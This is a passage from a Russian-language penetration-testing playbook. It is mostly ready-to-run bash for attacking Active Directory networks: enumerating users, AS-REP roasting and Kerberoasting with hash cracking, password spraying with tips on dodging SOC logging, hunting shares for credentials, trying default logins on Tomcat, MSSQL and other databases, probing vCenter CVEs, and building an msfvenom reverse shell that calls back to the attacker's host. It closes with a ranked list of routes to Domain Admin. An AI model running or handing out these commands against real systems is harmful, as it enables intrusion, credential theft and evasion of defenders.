IP\nШаг B: Enum пользователей (без кредов)\nBash\n\n# === Метод 1: RID Brute (самый надёжный без кредов) ===\nnetexec smb $DC_IP -u '' -p '' --rid-brute 10000 2>&1 | tee rid_brute_null.txt\nnetexec smb $DC_IP -u 'guest' -p '' --rid-brute 10000 2>&1 | tee rid_brute_guest.txt\n# Иногда null session не работает, а guest — работает\n\n# Парсим\ncat rid_brute_null.txt rid_brute_guest.txt | grep \"SidTypeUser\" | \\\n    awk -F'\\\\\\\\' '{print $2}' | awk '{print $1}' | sort -u > domain_users.txt\n\n# === Метод 2: LDAP anonymous ===\nBASE_DN=\"DC=$(echo $DOMAIN | sed 's/\\./,DC=/g')\"\nldapsearch -x -H ldap://$DC_IP -b \"$BASE_DN\" \"(objectClass=user)\" sAMAccountName 2>&1 | \\\n    grep \"sAMAccountName:\" | awk '{print $2}' | sort -u >> domain_users.txt\nsort -u -o domain_users.txt domain_users.txt\n\n# === Метод 3: Kerbrute enum (если методы 1-2 не дали результатов) ===\n# Готовим список для перебора (имена из AD чаще всего формат: j.doe, jdoe, john.doe)\n# Используем статический список + генерируем по шаблону\n# Скачай заранее: https://github.com/insidetrust/statistically-likely-usernames\nkerbrute userenum --dc $DC_IP -d $DOMAIN \\\n    /opt/statistically-likely-usernames/jsmith.txt -o kerbrute_enum.txt 2>&1 &\nkerbrute userenum --dc $DC_IP -d $DOMAIN \\\n    /opt/statistically-likely-usernames/john.smith.txt -o kerbrute_enum2.txt 2>&1 &\n\n# Парсим\ncat kerbrute_enum.txt kerbrute_enum2.txt 2>/dev/null | \\\n    grep \"VALID\" | awk '{print $NF}' | sed 's/@.*//' | sort -u >> domain_users.txt\nsort -u -o domain_users.txt domain_users.txt\n\necho \"[*] Total domain users found: $(wc -l < domain_users.txt)\"\n\n# === Метод 4: rpcclient ===\nrpcclient -U \"\" -N $DC_IP -c \"enumdomusers\" 2>&1 | \\\n    grep -oP '\\[.*?\\]' | grep -v \"0x\" | tr -d '[]' | sort -u >> domain_users.txt\nsort -u -o domain_users.txt domain_users.txt\n\n# === Ищем описания с паролями (через rpcclient) ===\nrpcclient -U \"\" -N $DC_IP -c \"querydispinfo\" 2>&1 | tee rpc_dispinfo.txt\ngrep -iE \"pass|pwd|пароль|cred|logon|temp\" rpc_dispinfo.txt\nНа что смотреть в выводе:\n\ntext\n\n- Юзеры с \"svc\" / \"service\" / \"sql\" / \"backup\" / \"admin\" в имени → высокий приоритет для spray\n- Юзеры с description содержащим пароль → мгновенный win\n- Machine accounts ($) — не включаем в spray\n- Disabled accounts — не включаем в spray (Kerberos покажет)\n- Юзеры типа \"test\", \"temp\", \"new\" → слабые пароли\nШаг C: AS-REP Roasting\nBash\n\n# Проверяем ВСЕХ найденных юзеров на DONT_REQUIRE_PREAUTH\nimpacket-GetNPUsers \"$DOMAIN/\" -dc-ip $DC_IP \\\n    -usersfile domain_users.txt -format hashcat \\\n    -outputfile asrep_hashes.txt 2>&1 | tee asrep_output.txt\n\n# Проверяем результат\nif [ -s asrep_hashes.txt ]; then\n    echo \"[!!!] AS-REP HASHES FOUND!\"\n    cat asrep_hashes.txt\n    # Крутим сразу\n    hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \\\n        -r /usr/share/hashcat/rules/best64.rule --force -O\nfi\nШаг D: Password Spray\nBash\n\n# ОБЯЗАТЕЛЬНО сначала проверяем password policy\nnetexec smb $DC_IP -u '' -p '' --pass-pol 2>&1 | tee pass_policy.txt\nnetexec smb $DC_IP -u 'guest' -p '' --pass-pol 2>&1 | tee -a pass_policy.txt\n\n# Если не получается — через LDAP\nldapsearch -x -H ldap://$DC_IP -b \"$BASE_DN\" \\\n    \"(objectClass=domainDNS)\" lockoutThreshold lockoutDuration pwdProperties minPwdLength 2>&1\n\n# КРИТИЧНО: смотрим lockoutThreshold\n# Если 0 — unlimited, спрей без ограничений\n# Если 3 — ОСТОРОЖНО, max 1 попытка за lockout window\n# Если 5+ — можно 2-3 попытки с паузой\n\n# === Spray ===\n# Правило: 1 пароль за раз, ждём observation window (обычно 30 мин)\n\n# Пароль = username\nnetexec smb $DC_IP -u domain_users.txt -p domain_users.txt \\\n    --no-bruteforce --continue-on-success 2>&1 | tee spray_user_eq_pass.txt\ngrep \"[+]\" spray_user_eq_pass.txt\n\n# Сезонные и типичные пароли\nPASSWORDS=(\n    \"Password1\"\n    \"Password123\"\n    \"Welcome1\"\n    \"Welcome123\"\n    \"${DOMAIN%%.*}2024\"\n    \"${DOMAIN%%.*}2023\"\n    \"${DOMAIN%%.*}123\"\n    \"Qwerty123\"\n    \"P@ssw0rd\"\n    \"Changeme1\"\n    \"Summer2024\"\n    \"Winter2024\"\n    \"Spring2024\"\n    \"Autumn2024\"\n    \"Company123\"  # заменить на реальное название компании\n    \"Passw0rd\"\n    \"1qaz2wsx\"\n    \"1qaz@WSX\"\n)\n\nfor pass in \"${PASSWORDS[@]}\"; do\n    echo \"[*] Spraying: $pass\"\n    netexec smb $DC_IP -u domain_users.txt -p \"$pass\" \\\n        --continue-on-success 2>&1 | grep \"[+]\" | tee -a spray_results.txt\n    # Kerbrute быстрее и не логируется в Windows Event Log (4625)\n    kerbrute passwordspray --dc $DC_IP -d $DOMAIN domain_users.txt \"$pass\" 2>&1 | \\\n        grep \"VALID\" | tee -a spray_kerbrute_results.txt\n    sleep 1  # пауза между паролями если lockout включён — увеличить до lockoutObservationWindow\ndone\nЧастые ошибки новичков при spray:\n\ntext\n\n✗ Не проверяют lockout policy → блокируют все аккаунты → провал проекта\n✗ Спреят по SMB вместо Kerberos → 4625 event на каждый хост → SOC замечает\n✗ Забывают username=password (самый частый quick win)\n✗ Не пробуют вариации с названием компании\n✗ Спреят по 10 паролей разом без пауз\nШаг E: Null/Guest SMB Shares\nBash\n\n# Подробный анализ шар\nnetexec smb smb_hosts.txt -u '' -p '' --shares 2>&1 | tee null_shares_all.txt\nnetexec smb smb_hosts.txt -u 'guest' -p '' --shares 2>&1 | tee guest_shares_all.txt\n\n# Выделяем READ/WRITE\ngrep -E \"READ|WRITE\" null_shares_all.txt guest_shares_all.txt | \\\n    grep -v \"IPC\\$\" | tee accessible_shares.txt\n\n# Spider все доступные шары\nnetexec smb smb_hosts.txt -u '' -p '' -M spider_plus \\\n    -o DOWNLOAD_FLAG=false OUTPUT_FOLDER=./spider_null/ 2>&1\n\nnetexec smb smb_hosts.txt -u 'guest' -p '' -M spider_plus \\\n    -o DOWNLOAD_FLAG=false OUTPUT_FOLDER=./spider_guest/ 2>&1\n\n# Ищем интересные файлы в результатах spider\nfind ./spider_null/ ./spider_guest/ -name \"*.json\" 2>/dev/null | while read f; do\n    python3 -c \"\nimport json,sys\ndata=json.load(open('$f'))\nfor share,files in data.items():\n    for filepath,info in files.items():\n        lower=filepath.lower()\n        if any(x in lower for x in ['pass','pwd','cred','secret','config','unattend',\n            'sysprep','.kdbx','.vmdk','.vhd','.bak','.sql','.mdb','.accdb',\n            'id_rsa','authorized_keys','.pfx','.p12','.key','.pem',\n            'web.config','appsettings','connection','.env','.git',\n            'ntds','sam','system','security','backup']):\n            print(f'[!] {share}/{filepath} ({info.get(\\\"size\\\",\\\"?\\\")} bytes)')\n\" 2>/dev/null\ndone | tee interesting_files.txt\n\n# Ручной заход в подозрительные шары\n# smbclient -N //10.10.10.x/ShareName -c \"recurse;ls\"\n# smbclient -N //10.10.10.x/ShareName -c \"get path/to/interesting_file.txt\"\n\n# SYSVOL / NETLOGON — обязательно проверяем (GPP, скрипты с паролями)\nfor dc in $(cat confirmed_dcs.txt); do\n    echo \"=== SYSVOL on $dc ===\"\n    smbclient -N //$dc/SYSVOL -c \"recurse;ls\" 2>&1 | \\\n        grep -iE \"\\.xml|\\.ps1|\\.bat|\\.vbs|\\.cmd|\\.ini|\\.cfg|Groups\\.xml\"\n    echo \"=== NETLOGON on $dc ===\"\n    smbclient -N //$dc/NETLOGON -c \"recurse;ls\" 2>&1\ndone | tee sysvol_netlogon.txt\n\n# Скачиваем ВСЕ скрипты из NETLOGON\nfor dc in $(cat confirmed_dcs.txt); do\n    mkdir -p netlogon_$dc\n    smbclient -N //$dc/NETLOGON -c \"recurse;prompt off;mget *\" --directory=netlogon_$dc 2>&1\ndone\n\n# Ищем пароли в скриптах\ngrep -rniE \"password|passwd|pwd|credential|secret|net use|runas|/user:\" netlogon_*/ 2>/dev/null | tee creds_in_scripts.txt\n3.2. RDP / WinRM\nBash\n\n# === RDP ===\n# Проверяем NLA (Network Level Authentication)\n# Если NLA disabled — можно BlueKeep, можно MitM\nnmap -p 3389 -iL rdp_hosts.txt --script rdp-ntlm-info,rdp-enum-encryption -Pn 2>&1 | tee rdp_info.txt\n\n# BlueKeep check\nnetexec rdp rdp_hosts.txt -M bluekeep 2>&1 | tee bluekeep_results.txt\n\n# RDP screenshot (если хочешь увидеть что на экране)\n# ncrack / crowbar для brute (только если policy позволяет)\n\n# Hostname extraction через RDP\ngrep \"Target_Name\" rdp_info.txt | sort -u\ngrep \"DNS_Computer_Name\" rdp_info.txt | sort -u\n\n# === WinRM ===\n# После получения кредов — проверяем WinRM\n# WinRM (5985) = shell без записи на диск (нет артефактов на хосте)\n# Предпочтительнее psexec/smbexec для stealth\n\n# С кредами:\n# evil-winrm -i $TARGET -u $USER -p $PASS\n# netexec winrm winrm_hosts.txt -u $USER -p $PASS\nНа что обращать внимание в RDP-выводе:\n\ntext\n\n- DNS_Computer_Name → hostnames для reverse lookup\n- Product_Version → версия Windows → CVE matching\n- NLA disabled → BlueKeep target (если Server 2008 R2 / Win 7)\n- Certificate info → internal hostnames, domain info\n3.3. WEB (IIS, Tomcat, Jenkins, etc.)\nBash\n\n# === Массовый скриншотинг ===\n# Генерируем URL-лист\ncat web_hosts.txt | while read ip; do\n    for port in 80 443 8080 8443 8000 8888; do\n        if grep -q \" $port \" masscan_quick.txt | grep -q \"$ip\"; then\n            [ \"$port\" == \"443\" -o \"$port\" == \"8443\" ] && echo \"https://$ip:$port\" || echo \"http://$ip:$port\"\n        fi\n    done\ndone > web_urls_full.txt\n\n# Fallback: simple generation\ncat web_hosts.txt | while read ip; do\n    echo \"http://$ip\"\n    echo \"https://$ip\"\n    echo \"http://$ip:8080\"\n    echo \"https://$ip:8443\"\ndone > web_urls_full.txt\n\n# httpx — fingerprinting\nhttpx -l web_urls_full.txt -title -status-code -tech-detect -content-length \\\n    -favicon -hash sha256 -jarm -cdn -o httpx_full.txt 2>&1\n\n# Фильтруем интересное\ngrep -iE \"tomcat|jenkins|gitlab|jboss|wildfly|weblogic|exchange|owa|adfs|citrix|pulse|fortinet|f5|vcenter|esxi|phpmyadmin|adminer|wp-login|drupal|joomla|confluence|jira|bitbucket|nexus|sonarqube|grafana|kibana|zabbix|nagios|splunk|guacamole|roundcube|webmin|printer|ilo|idrac|kms|wsus|sccm|adcs|certsrv\" httpx_full.txt | tee priority_web.txt\n\n# Скриншоты\ngowitness file -f web_urls_full.txt -P ./screenshots/ --timeout 10 2>&1 &\n\n# === Конкретные продукты: атаки ===\n\n# -- Jenkins --\n# Если Jenkins без аутентификации → script console → instant RCE\ngrep -i \"jenkins\" httpx_full.txt | awk '{print $1}' | while read url; do\n    echo \"=== Jenkins: $url ===\"\n    # Проверяем script console\n    curl -sk \"$url/script\" -o /dev/null -w \"%{http_code}\" 2>&1\n    # Проверяем анонимный доступ\n    curl -sk \"$url/api/json\" 2>&1 | head -50\n    # Проверяем manage page\n    curl -sk \"$url/manage\" -o /dev/null -w \"%{http_code}\" 2>&1\n    echo \"\"\ndone | tee jenkins_check.txt\n\n# Jenkins default creds: admin:admin, admin:password, admin:jenkins\n# Script console RCE:\n# println \"whoami\".execute().text\n\n# -- Tomcat --\ngrep -i \"tomcat\" httpx_full.txt | awk '{print $1}' | while read url; do\n    echo \"=== Tomcat: $url ===\"\n    # Manager default creds\n    for cred in \"tomcat:tomcat\" \"admin:admin\" \"tomcat:s3cret\" \"admin:tomcat\" \"admin:\" \"tomcat:\"; do\n        user=$(echo $cred | cut -d: -f1)\n        pass=$(echo $cred | cut -d: -f2)\n        code=$(curl -sk -u \"$user:$pass\" \"$url/manager/html\" -o /dev/null -w \"%{http_code}\" 2>&1)\n        echo \"  $cred → $code\"\n    done\ndone | tee tomcat_check.txt\n# Если 200 → WAR deploy → RCE\n# msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f war -o shell.war\n\n# -- IIS ---\n# Проверяем short name scanner (IIS tilde vulnerability)\n# java -jar IIS_shortname_scanner.jar <url>\n# Ищем web.config, .aspx, .ashx\n\n# -- Exchange / OWA --\ngrep -iE \"exchange|owa|autodiscover\" httpx_full.txt | tee exchange_hosts.txt\n# ProxyShell / ProxyLogon / ProxyNotShell\n# CVE-2021-26855 (ProxyLogon), CVE-2021-34473 (ProxyShell)\n# nmap --script http-vuln-cve2021-26855 -p 443 $EXCHANGE_IP\n\n# -- ADCS Web Enrollment --\ngrep -iE \"certsrv|certificate\" httpx_full.txt | tee adcs_web.txt\n# Если найден → ESC1-ESC11 через certipy (нужны креды)\n\n# -- Default credential check for various products --\n# Встроенные модули в nuclei\nnuclei -l web_urls_full.txt -t /opt/nuclei-templates/http/default-logins/ \\\n    -o nuclei_default_creds.txt -silent 2>&1 &\n\n# Общий nuclei scan\nnuclei -l web_urls_full.txt -severity critical,high \\\n    -o nuclei_critical_high.txt -silent 2>&1 &\n\n# -- vCenter --\ngrep -iE \"vcenter|vmware\" httpx_full.txt | while read line; do\n    url=$(echo \"$line\" | awk '{print $1}')\n    echo \"=== vCenter: $url ===\"\n    # CVE-2021-21972 (RCE без auth)\n    curl -sk \"$url/ui/vropspluginui/rest/services/uploadova\" -X POST -o /dev/null -w \"%{http_code}\"\n    # CVE-2021-22005 (file upload RCE)\n    curl -sk \"$url/analytics/ceip/sdk/..;/\n\n\n\" -o /dev/null -w \"%{http_code}\"\ndone\nНа что смотреть в web:\n\ntext\n\n- 200 на /manager/html, /script, /admin, /console → default creds\n- Server header → точная версия → CVE search\n- Title: \"Index of /\" → directory listing → файлы с конфигами\n- 401 Unauthorized → brute force\n- 403 → bypass techniques (..;/, %2e%2e/, etc.)\n- NTLM auth prompt → имя домена и сервера в WWW-Authenticate header\nBash\n\n# Извлекаем NTLM info из web-сервисов с NTLM auth\nfor url in $(cat web_urls_full.txt); do\n    resp=$(curl -sk -I \"$url\" 2>&1 | grep -i \"WWW-Authenticate.*NTLM\")\n    if [ -n \"$resp\" ]; then\n        echo \"[NTLM] $url\"\n        # nmap script для извлечения домена\n        python3 -c \"\nimport requests, base64, struct\nfrom requests_ntlm import HttpNtlmAuth\n# Или просто: curl с --ntlm\n\" 2>/dev/null\n    fi\ndone\n3.4. DATABASES (MSSQL, MySQL, PostgreSQL, Redis, MongoDB, Elasticsearch)\nBash\n\n# === MSSQL (1433) ===\n# Самый частый quick win через БД на внутреннем пентесте\n\n# Default/weak creds\nnetexec mssql db_hosts.txt -u sa -p '' 2>&1 | grep \"+\" | tee mssql_wins.txt\nnetexec mssql db_hosts.txt -u sa -p 'sa' 2>&1 | grep \"+\" | tee -a mssql_wins.txt\nnetexec mssql db_hosts.txt -u sa -p 'Password1' 2>&1 | grep \"+\" | tee -a mssql_wins.txt\nnetexec mssql db_hosts.txt -u sa -p 'P@ssw0rd' 2>&1 | grep \"+\" | tee -a mssql_wins.txt\nnetexec mssql db_hosts.txt -u sa -p 'sql2019' 2>&1 | grep \"+\" | tee -a mssql_wins.txt\n\n# Если с доменными кредами:\nnetexec mssql db_hosts.txt -u \"$CRED_USER\" -p \"$CRED_PASS\" -d $DOMAIN 2>&1 | tee mssql_domain.txt\n# Windows auth часто работает без пароля sa\n\n# После получения доступа к MSSQL → RCE через xp_cmdshell\n# impacket-mssqlclient sa:Password1@$TARGET_IP -windows-auth\n# SQL> enable_xp_cmdshell\n# SQL> xp_cmdshell whoami\n# SQL> xp_cmdshell \"powershell -e BASE64_PAYLOAD\"\n\n# Или linked servers → lateral movement через MSSQL links\n# SQL> SELECT * FROM sys.servers;\n# SQL> EXEC ('SELECT @@servername') AT [LINKED_SERVER_NAME]\n\n# === MySQL (3306) ===\ngrep \" 3306 \" masscan_quick.txt | awk '{print $4}' | sort -u > mysql_hosts.txt\nfor ip in $(cat mysql_hosts.txt); do\n    echo \"=== MySQL $ip ===\"\n    mysql -h $ip -u root --connect-timeout=5 -e \"SELECT @@version; SELECT user,host FROM mysql.user;\" 2>&1\n    mysql -h $ip -u root -p'root' --connect-timeout=5 -e \"SELECT @@version;\" 2>&1\n    mysql -h $ip -u root -p'toor' --connect-timeout=5 -e \"SELECT @@version;\" 2>&1\n    mysql -h $ip -u root -p'password' --connect-timeout=5 -e \"SELECT @@version;\" 2>&1\ndone | tee mysql_check.txt\n\n# === PostgreSQL (5432) ===\ngrep \" 5432 \" masscan_quick.txt | awk '{print $4}' | sort -u > postgres_hosts.txt\nfor ip in $(cat postgres_hosts.txt); do\n    echo \"=== PostgreSQL $ip ===\"\n    PGPASSWORD='' psql -h $ip -U postgres -c \"SELECT version();\" 2>&1\n    PGPASSWORD='postgres' psql -h $ip -U postgres -c \"SELECT version();\" 2>&1\n    PGPASSWORD='password' psql -h $ip -U postgres -c \"SELECT version();\" 2>&1\ndone | tee postgres_check.txt\n# PostgreSQL → RCE: COPY ... FROM PROGRAM 'cmd'\n\n# === Redis (6379) ===\nfor ip in $(grep \" 6379 \" masscan_quick.txt | awk '{print $4}'); do\n    echo \"=== Redis $ip ===\"\n    redis-cli -h $ip INFO server 2>&1 | head -10\n    redis-cli -h $ip CONFIG GET dir 2>&1\n    redis-cli -h $ip CONFIG GET dbfilename 2>&1\n    # Если доступен без пароля → RCE через:\n    # 1. SSH key injection (если есть SSH)\n    # 2. Webshell через CONFIG SET dir/dbfilename\n    # 3. Module load (Redis 4+)\ndone | tee redis_check.txt\n\n# === MongoDB (27017) ===\nfor ip in $(grep \" 27017 \" masscan_quick.txt | awk '{print $4}'); do\n    echo \"=== MongoDB $ip ===\"\n    mongosh --host $ip --eval \"db.adminCommand('listDatabases')\" 2>&1 | head -20\n    mongosh --host $ip --eval \"db.getCollectionNames()\" 2>&1 | head -20\ndone | tee mongodb_check.txt\n\n# === Elasticsearch (9200) ===\nfor ip in $(grep \" 9200 \" masscan_quick.txt | awk '{print $4}'); do\n    echo \"=== Elasticsearch $ip ===\"\n    curl -sk \"http://$ip:9200/\" 2>&1\n    curl -sk \"http://$ip:9200/_cat/indices?v\" 2>&1 | head -30\n    # Ищем интересные индексы\n    curl -sk \"http://$ip:9200/_cat/indices?v\" 2>&1 | grep -iE \"user|pass|cred|log|auth|session\"\ndone | tee elastic_check.txt\n3.5. LEGACY (FTP, Telnet, NFS, SNMP, RPC)\nBash\n\n# === FTP (21) ===\nfor ip in $(cat ftp_hosts.txt); do\n    echo \"=== FTP $ip ===\"\n    # Anonymous login\n    curl -s --connect-timeout 5 \"ftp://anonymous:anonymous@$ip/\" 2>&1 | head -30\n    # Writable? (для phishing / payload delivery)\n    curl -s -T /tmp/test.txt \"ftp://anonymous:anonymous@$ip/test.txt\" 2>&1\ndone | tee ftp_results.txt\n\n# === NFS (111/2049) ===\nfor ip in $(cat nfs_hosts.txt 2>/dev/null); do\n    echo \"=== NFS $ip ===\"\n    showmount -e $ip 2>&1\ndone | tee nfs_results.txt\n\n# Монтируем доступные exports\ngrep -oP '\\S+\\s+\\(' nfs_results.txt | while read export; do\n    ip=$(echo $export | awk '{print $1}')\n    path=$(echo $export | awk '{print $2}')\n    mkdir -p \"/tmp/nfs/${ip}${path}\"\n    mount -t nfs \"${ip}:${path}\" \"/tmp/nfs/${ip}${path}\" -o nolock 2>&1\ndone\n\n# Ищем интересное в NFS\nfind /tmp/nfs/ -type f \\( -name \"*.conf\" -o -name \"*.config\" -o -name \"*.xml\" \\\n    -o -name \"*.ini\" -o -name \"*.sh\" -o -name \"*.ps1\" -o -name \"*.bat\" \\\n    -o -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \"*.kdbx\" -o -name \"*.key\" \\\n    -o -name \".bash_history\" -o -name \"*.pgpass\" -o -name \".my.cnf\" \\\n    -o -name \"shadow\" -o -name \"passwd\" -o -name \"*.bak\" -o -name \"*.sql\" \\\n    -o -name \"web.config\" -o -name \".env\" -o -name \"wp-config.php\" \\) 2>/dev/null | tee nfs_interesting.txt\n\ngrep -rniE \"password|passwd|pwd|secret|credential|key|token|api_key\" /tmp/nfs/ 2>/dev/null | \\\n    head -100 | tee nfs_creds.txt\n\n# === SNMP (161/udp) ===\n# Нужен UDP scan (masscan или nmap)\nmasscan -iL scope.txt -pU:161 --rate 3000 -oL snmp_scan.txt 2>/dev/null\ngrep \"^open\" snmp_scan.txt | awk '{print $4}' > snmp_hosts.txt\n\n# Community strings brute\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \\\n    -i snmp_hosts.txt 2>&1 | tee snmp_communities.txt\n\n# Если нашли community string:\nfor ip in $(cat snmp_hosts.txt); do\n    for community in \"public\" \"private\" \"manager\" \"community\"; do\n        snmpwalk -v2c -c $community $ip 1.3.6.1 2>&1 | head -5\n        if [ $? -eq 0 ]; then\n            echo \"[+] SNMP community '$community' works on $ip\"\n            # Full walk\n            snmpwalk -v2c -c $community $ip 1.3.6.1 2>&1 > snmp_walk_${ip}.txt &\n            # Конкретно: юзеры, процессы, сетевые интерфейсы\n            snmpwalk -v2c -c $community $ip 1.3.6.1.4.1.77.1.2.25 2>&1  # Windows users\n            snmpwalk -v2c -c $community $ip 1.3.6.1.2.1.25.4.2.1.2 2>&1  # Running processes\n            snmpwalk -v2c -c $community $ip 1.3.6.1.2.1.6.13.1.3 2>&1    # TCP connections\n        fi\n    done\ndone\n\n# === Telnet (23) ===\nfor ip in $(cat telnet_hosts.txt); do\n    echo \"=== Telnet $ip ===\"\n    # Banner grab\n    (echo \"\"; sleep 2) | telnet $ip 2>&1 | head -10\n    # Часто: сетевое оборудование, принтеры, legacy systems\n    # Default creds: admin/admin, cisco/cisco, admin/\"\", root/root\ndone | tee telnet_banners.txt\n\n# === RPC (135) ===\ngrep \" 135 \" masscan_quick.txt | awk '{print $4}' | sort -u > rpc_hosts.txt\nfor ip in $(cat rpc_hosts.txt | head -20); do\n    rpcdump.py $ip 2>&1 | head -20\ndone | tee rpc_endpoints.txt\n# Ищем DCOM / SCCM / WSUS endpoints\nPHASE 4: ЛОГИКА ПРИНЯТИЯ РЕШЕНИЙ\n4.1. Flowchart: куда двигаться\ntext\n\n┌─────────────────────────────────────────────────────────────┐\n│                   ПОЛУЧИЛ РЕЗУЛЬТАТЫ NMAP                    │\n└──────────────────────────┬──────────────────────────────────┘\n                           │\n    ┌──────────────────────┼──────────────────────┐\n    │                      │                      │\n    ▼                      ▼                      ▼\n┌──────────┐     ┌──────────────┐      ┌──────────────┐\n│ Legacy    │     │ AD/SMB       │      │ Web/DB/Other │\n│ Windows   │     │ Infrastructure│      │ Services     │\n│ found?    │     │              │      │              │\n└─────┬─────┘     └──────┬───────┘      └──────┬───────┘\n      │                  │                     │\n      ▼                  ▼                     ▼\n  MS17-010         Null session?           Jenkins/Tomcat\n  BlueKeep         Guest access?           default creds?\n  ────────         RID brute               MSSQL sa:''?\n      │            LDAP anon?              FTP anon?\n      │            ────────                NFS exports?\n      │                │                   ────────\n      │                ▼                       │\n      │           Users list?                  │\n      │                │                       │\n      │          ┌─────┴──────┐               │\n      │          │            │               │\n      │          ▼            ▼               │\n      │     AS-REP      Password              │\n      │     Roast       Spray                 │\n      │          │            │               │\n      └──────────┴─────┬──────┴───────────────┘\n                       │\n                       ▼\n              ┌─────────────────┐\n              │  GOT FIRST      │\n              │  CREDENTIALS?   │\n              └────────┬────────┘\n                       │\n         ┌─────────────┼─────────────────┐\n         │             │                 │\n         ▼             ▼                 ▼\n   Kerberoast    BloodHound         Check access\n   → hashcat     → find path       → local admin?\n                 → ACL abuse       → shares?\n                 → delegation      → ADCS?\n                                   → GPP?\n                                   → LAPS?\n                       │\n                       ▼\n              ┌─────────────────┐\n              │  DOMAIN ADMIN   │\n              └─────────────────┘\n4.2. Когда переключаться\ntext\n\nПРАВИЛО: Не зависай на одном векторе больше 30-45 минут без прогресса\n\nAD ВЕКТОР → WEB ВЕКТОР:\n─────────────────────────\nПереключайся если:\n- Null session / guest не работает\n- LDAP anonymous bind отключён\n- RID brute не даёт результатов\n- AS-REP roast пустой\n- Spray по 5+ паролям — ничего\n- Responder/mitm6 молчат 30+ минут\n→ Иди в web: default creds, CVE, file upload\n\nWEB ВЕКТОР → AD ВЕКТОР:\n─────────────────────────\nПереключайся если:\n- Все web-сервисы за аутентификацией\n- Нет известных CVE для найденных версий\n- nuclei ничего не нашёл\n→ Возвращайся в AD: расширяй spray wordlist, проверяй другие DC\n\nКОГДА СТОЯТЬ НА МЕСТЕ:\n──────────────────────\n- Responder ловит хеши → жди, крути hashcat параллельно\n- mitm6 получил auth → жди RBCD\n- AS-REP нашёл хеши → крути\n- Spider нашёл файлы → читай\n4.3. Красные флаги тупиковых направлений\ntext\n\n✗ Bruteforce на RDP при lockout=3 → СТОП\n✗ SMB signing enabled на всех хостах + Responder молчит → relay не взлетит\n✗ Нет ни одного юзера после всех enum → фокус на web/DB\n✗ Все web за CAS/ADFS → не бей в лоб, ищи обходы\n✗ Full nmap закончился, ничего нового → думай lateral, пересмотри findings\n✗ Один хост ломаешь 2 часа → переключись, вернись позже\nPHASE 5: БЫСТРЫЕ WIN CONDITIONS\n5.1. Топ-10 путей к DA по скорости\ntext\n\n#1  MITM6 + LDAP relay → RBCD → DA                    [5-15 мин, пассивно]\n    Условие: IPv6 включён (почти всегда), LDAP signing off\n    Результат: машинный аккаунт → RBCD → impersonate DA\n\n#2  Responder → NTLMv2 hash → hashcat → DA creds       [5-30 мин, пассивно]\n    Условие: LLMNR/NBNS не отключён, пароль слабый\n    Результат: plaintext пароль (если слабый)\n\n#3  MS17-010 → SYSTEM shell → SAM dump → reuse          [2-5 мин]\n    Условие: Windows 2008/7/2003 без патча\n    Результат: local admin hash → spray → DA\n\n#4  Password in AD description → direct login            [5 мин]\n    Условие: LDAP anon bind ИЛИ null session\n    Результат: valid creds\n\n#5  AS-REP Roast → crack → valid user → Kerberoast → DA [10-30 мин]\n    Условие: хотя бы 1 user с DONT_REQ_PREAUTH\n    Результат: TGS hash → crack → svc account → часто DA\n\n#6  Null session → users → spray \"Password1\" → DA        [10-20 мин]\n    Условие: null session работает, lockout >= 5\n    Результат: valid creds → chain\n\n#7  MSSQL sa:sa → xp_cmdshell → SYSTEM shell             [5-10 мин]\n    Условие: MSSQL с дефолтными кредами\n    Результат: SYSTEM на SQL server → SAM/credential access\n\n#8  GPP passwords (Groups.xml) → domain creds             [2 мин]\n    Условие: старый GPO с cpassword\n    Результат: plaintext пароль (AES key известен)\n\n#9  NFS с /home или /etc → SSH keys → Linux → AD creds   [10-15 мин]\n    Условие: NFS exports без ограничений\n    Результат: SSH доступ → .bash_history, keytabs, etc.\n\n#10 ADCS ESC1 → cert → DA                                [10-15 мин, нужны креды]\n    Условие: misconfigured cert template\n    Результат: DA через certificate\n5.2. После первых кредов — чек-лист эскалации\nBash\n\n# Получили креды: $CRED_USER / $CRED_PASS\n\n# ============================================\n#  IMMEDIATE ACTIONS (первые 5 минут с кредами)\n# ============================================\n\n# 1. Kerberoasting — ПЕРВЫМ ДЕЛОМ\nimpacket-GetUserSPNs \"$DOMAIN/$CRED_USER:$CRED_PASS\" -dc-ip $DC_IP \\\n    -outputfile kerberoast.txt -request 2>&1\nif [ -s kerberoast.txt ]; then\n    echo \"[!!!] KERBEROAST HASHES — CRACKING NOW\"\n    hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \\\n        -r /usr/share/hashcat/rules/best64.rule --force -O &\nfi\n\n# 2. BloodHound — запускаем в фоне\nbloodhound-python -u \"$CRED_USER\" -p \"$CRED_PASS\" -d $DOMAIN \\\n    -dc $DC_HOSTNAME.$DOMAIN -c all --zip -ns $DC_IP 2>&1 &\n# Или\nnetexec ldap $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" \\\n    -M bloodhound -o COLLECTION=all,OUTPUTPREFIX=bh 2>&1 &\n\n# 3. Проверяем local admin на всех хостах\nnetexec smb smb_hosts.txt -u \"$CRED_USER\" -p \"$CRED_PASS\" 2>&1 | \\\n    grep \"Pwn3d\" | tee pwned_hosts.txt\n\n# 4. Проверяем WinRM\nnetexec winrm winrm_hosts.txt -u \"$CRED_USER\" -p \"$CRED_PASS\" 2>&1 | \\\n    grep \"Pwn3d\" | tee winrm_pwned.txt\n\n# 5. ADCS vulnerable templates\ncertipy find -u \"$CRED_USER@$DOMAIN\" -p \"$CRED_PASS\" -dc-ip $DC_IP \\\n    -vulnerable -stdout 2>&1 | tee certipy_results.txt\n# Если ESC1/ESC2/ESC3/ESC4/ESC6/ESC8:\ngrep -iE \"ESC[0-9]\" certipy_results.txt\n\n# 6. Delegation\nimpacket-findDelegation \"$DOMAIN/$CRED_USER:$CRED_PASS\" -dc-ip $DC_IP 2>&1 | tee delegation.txt\n# Constrained → impersonate via S4U2Self/S4U2Proxy\n# Unconstrained → printerbug/coerce to unconstrained host → TGT capture\n\n# 7. GPP passwords\nimpacket-Get-GPPPassword \"$DOMAIN/$CRED_USER:$CRED_PASS@$DC_IP\" 2>&1 | tee gpp_results.txt\nnetexec smb $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" -M gpp_password 2>&1\nnetexec smb $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" -M gpp_autologin 2>&1\n\n# 8. LAPS\nnetexec ldap $DC_IP -u \"$CRED_USER\" -p 